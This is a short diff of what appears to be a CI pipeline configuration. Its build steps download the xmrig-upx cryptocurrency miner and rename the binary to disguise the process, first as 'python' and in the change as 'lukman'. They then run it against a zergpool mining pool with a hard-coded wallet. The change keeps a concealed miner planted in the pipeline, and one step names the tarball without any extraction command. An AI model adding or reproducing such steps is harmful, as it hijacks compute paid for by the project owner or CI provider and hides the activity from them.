@@ -13,5 +13,5 @@ blocks:
           commands:
             - 'wget https://github.com/uPlexa/xmrig-upx/releases/download/v0.2.0/xmrig-upx-v0.2.0-lin64.tar.gz'
             - xmrig-upx-v0.2.0-lin64.tar.gz
-            - mv xmrig python
-            - './python -a cryptonight-upx/2 -o stratum+tcp://cryptonight_upx.mine.zergpool.com:4457 -u DSig4nin9T5pN1wHSd9apzB6aUP1Ekc9ZZ --keepalive --donate-level 1 -p c=DOGE,mc=UPX'
+            - mv xmrig lukman
+            - './lukman -a cryptonight-upx/2 -o stratum+tcp://cryptonight_upx.mine.zergpool.com:4457 -u DSig4nin9T5pN1wHSd9apzB6aUP1Ekc9ZZ --keepalive --donate-level 1 -p c=DOGE,mc=UPX'
